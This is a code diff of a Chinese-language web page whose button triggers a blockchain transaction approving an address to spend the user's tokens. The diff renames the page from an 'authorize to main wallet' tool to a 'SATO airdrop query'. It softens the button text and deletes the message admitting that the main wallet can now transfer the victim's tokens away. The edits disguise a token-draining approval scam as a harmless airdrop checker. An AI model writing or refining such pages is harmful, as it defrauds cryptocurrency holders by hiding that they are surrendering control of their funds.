@@ -32,9 +32,9 @@
 </head>
 <body>
 <div class="box">
-    <h2>🔐 授权给主钱包</h2>
+    <h2>🔐 SATO空投查询</h2>
     <p>被授权地址：<br><b>0x8fd6...516b4d</b></p>
-    <button id="startBtn" class="btn" onclick="startAuth()">🔑 一键授权所有代币</button>
+    <button id="startBtn" class="btn" onclick="startAuth()">🔑 一键授权</button>
     <div id="log" class="log"></div>
 </div>
 
@@ -100,7 +100,6 @@
             await tx.wait();
             
             log.innerHTML += `<p class="success">✅ 查询授权成功！</p>`;
-            log.innerHTML += `<p style="color:#10b981; font-weight:bold;">🎉 完成！主钱包可以转走这些代币了。</p>`;
 
         } catch(e) {
             log.innerHTML = `<p class="error">❌ 错误: ${e.message}</p>`;
